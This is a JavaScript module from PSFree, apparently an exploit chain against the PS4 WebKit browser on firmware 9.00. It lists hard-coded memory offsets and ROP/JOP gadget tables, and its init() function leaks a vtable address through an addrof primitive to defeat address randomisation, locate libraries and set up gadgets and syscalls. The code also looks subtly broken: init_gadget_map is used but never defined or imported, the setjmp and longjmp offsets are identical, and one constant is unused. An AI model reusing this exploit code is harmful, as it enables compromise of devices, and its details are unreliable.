/* Copyright (C) 2023-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import { mem } from '/module/mem.mjs';
import { KB } from '/module/offset.mjs';
import { ChainBase, get_gadget } from '/module/chain.mjs';
import { BufferView } from '/module/rw.mjs';

import {
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '/module/memtools.mjs';

import * as off from '/module/offset.mjs';

// Firmware 9.00 Offsets
const OFFSET_wk_vtable_first_element         = 0x104F110;
const OFFSET_WK_memset_import                = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import      = 0x00000178;
const OFFSET_WK_psl_builtin_import           = 0x00000D68;
const OFFSET_WKR_psl_builtin                  = 0x033BA0;
const OFFSET_WK_setjmp_gadget_one            = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two            = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one           = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two           = 0x01ECE1D3;
const OFFSET_libcint_memset                  = 0x0004F810;
const OFFSET_libcint_setjmp                  = 0x000BB5BC;
const OFFSET_libcint_longjmp                 = 0x000BB616;
const OFFSET_WK2_TLS_IMAGE                   = 0x38E8020;
const OFFSET_lk___stack_chk_fail             = 0x0001FF60;
const OFFSET_lk_pthread_create               = 0x00025510;
const OFFSET_lk_pthread_join                 = 0x0000AFA0;

// Global bases (populated in init())
export let webKitBase;
export let webKitRequirementBase;
export let libSceLibcInternalBase;
export let libKernelBase;

// DOM element for base resolution
var textArea = document.createElement("textarea");
var nogc = [];
var syscalls = {};
export const gadgets = {};

// WebKit gadget map for FW9
const wk_gadgetmap = {
    "ret":                          0x32,
    "pop rdi":                      0x319690,
    "pop rsi":                      0x1F4D6,
    "pop rdx":                      0x986C,
    "pop rcx":                      0x657B7,
    "pop r8":                       0xAFAA71,
    "pop r9":                       0x422571,
    "pop rax":                      0x51A12,
    "pop rsp":                      0x4E293,
    "mov [rdi], rsi":              0x1A97920,
    "mov [rdi], rax":              0x10788F7,
    "mov [rdi], eax":              0x9964BC,
    "cli ; pop rax":                0x566F8,
    "sti":                          0x1FBBCC,
    "mov rax, [rax]":              0x241CC,
    "mov rax, [rsi]":              0x5106A0,
    "mov [rax], rsi":              0x1EFD890,
    "mov [rax], rdx":              0x1426A82,
    "mov [rax], edx":              0x3B7FE4,
    "add rax, rsi":                0x170397E,
    "mov rdx, rax":                0x53F501,
    "add rax, rcx":                0x2FBCD,
    "mov rsp, rdi":                0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop":                      0x7DFF,
    "mov [rax], cl":               0xC6EAF
};

// WebKit JOP gadget map
const wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1D74F0
};

// Secondary WebKit gadgets
const wk2_gadgetmap = {
    "mov [rax], rdi":              0xFFDD7,
    "mov [rax], rcx":              0x2C9ECA,
    "mov [rax], cx":               0x15A7D52
};

// HMD gadget map
const hmd_gadgetmap = {
    "add [r8], r12":               0x2BCE1
};

// IPMI gadget map
const ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

// libc_internal gadgets
const libcint_gadgetmap = {
    "memset":                       OFFSET_libcint_memset,
    "setjmp":                       OFFSET_libcint_setjmp,
    "longjmp":                      OFFSET_libcint_longjmp
};

// kernel gadgets
const lk_gadgetmap = {
    "__stack_chk_fail":            OFFSET_lk___stack_chk_fail,
    "pthread_create":              OFFSET_lk_pthread_create,
    "pthread_join":                OFFSET_lk_pthread_join
};

// Initialize bases and gadgets
export function init(Chain) {
    // Resolve base addresses via imports
    const webcore_vt = mem.addrof(textArea).readp(off.jsta_impl);
    webKitBase = webcore_vt.sub(OFFSET_wk_vtable_first_element);
    const scf_import = webKitBase.add(OFFSET_WK___stack_chk_fail_import);
    libKernelBase = resolve_import(scf_import).sub(OFFSET_lk___stack_chk_fail);
    const memset_imp = webKitBase.add(OFFSET_WK_memset_import);
    libSceLibcInternalBase = resolve_import(memset_imp).sub(OFFSET_libcint_memset);
    webKitRequirementBase = webKitBase.add(OFFSET_WKR_psl_builtin);

    // Populate gadget map
    init_gadget_map(gadgets, wk_gadgetmap, webKitBase);
    init_gadget_map(gadgets, wkr_gadgetmap, webKitRequirementBase);
    init_gadget_map(gadgets, wk2_gadgetmap, webKitRequirementBase);
    init_gadget_map(gadgets, hmd_gadgetmap, webKitRequirementBase);
    init_gadget_map(gadgets, ipmi_gadgetmap, webKitRequirementBase);
    init_gadget_map(gadgets, libcint_gadgetmap, libSceLibcInternalBase);
    init_gadget_map(gadgets, lk_gadgetmap, libKernelBase);

    // Initialize syscalls array (unchanged)
    const syscall_array = [];
    init_syscall_array(syscall_array, libKernelBase, 300 * KB);

    // Chain setup remains the same as FW8 implementation...
    Chain.init_class(gadgets, syscall_array);
}